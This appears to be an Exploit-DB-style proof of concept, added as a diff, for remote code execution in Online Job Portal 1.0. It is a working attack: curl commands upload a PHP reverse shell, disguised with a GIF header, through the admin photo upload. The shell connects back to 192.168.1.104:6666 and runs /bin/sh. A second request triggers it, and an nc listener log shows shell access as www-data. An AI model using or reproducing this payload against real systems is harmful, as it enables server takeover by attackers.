@@ -1,0 +1,33 @@
+# Exploit Title: Online Job Portal 1.0 - Remote Code Execution
+# Dork: N/A
+# Date: 2020-02-06
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/php/13850/online-job-portal-phppdo.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/jobportal.zip
+# Version: 1.0
+# Tested on: Linux
+# CVE: N/A
+
+# POC: 
+# 1)
+# 
+curl -i -s -k -X $'POST' \
+    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------1852293616672951051689730436' -H $'Content-Length: 781' -H $'Referer: http://localhost/[PATH]/admin/user/index.php?view=view' -H $'Cookie: PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' \
+    --data-binary $'-----------------------------1852293616672951051689730436\x0d\x0aContent-Disposition: form-data; name=\"mealid\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------1852293616672951051689730436\x0d\x0aContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\x0d\x0a\x0d\x0a1000000\x0d\x0a-----------------------------1852293616672951051689730436\x0d\x0aContent-Disposition: form-data; name=\"photo\"; filename=\"exp.php\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0aGIF89c;\x0d\x0a<?php $sock = fsockopen(\'192.168.1.104\',6666);\x0d\x0a$descriptorspec = array(\x0d\x0a0 => $sock,\x0d\x0a1 => $sock,\x0d\x0a2 => $sock\x0d\x0a);\x0d\x0a\x0d\x0a$process = proc_open(\'/bin/sh\', $descriptorspec, $pipes);\x0d\x0aproc_close($process);?>\x0d\x0a\x0d\x0a-----------------------------1852293616672951051689730436\x0d\x0aContent-Disposition: form-data; name=\"savephoto\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------1852293616672951051689730436--\x0d\x0a' \
+    $'http://localhost/[PATH]/admin/user/controller.php?action=photos'
+# 
+curl -i -s -k -X $'GET' \
+    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Cookie: PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'PHPSESSID=8aftj770keh6dlgj5sd4a1t5i4' \
+    $'http://localhost/[PATH]/admin/user/photos/exp.php'
+# 
+root@ihsan:~/ExploitDB# nc -nlvp 6666
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::6666
+Ncat: Listening on 0.0.0.0:6666
+Ncat: Connection from 192.168.1.104.
+Ncat: Connection from 192.168.1.104:35574.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#
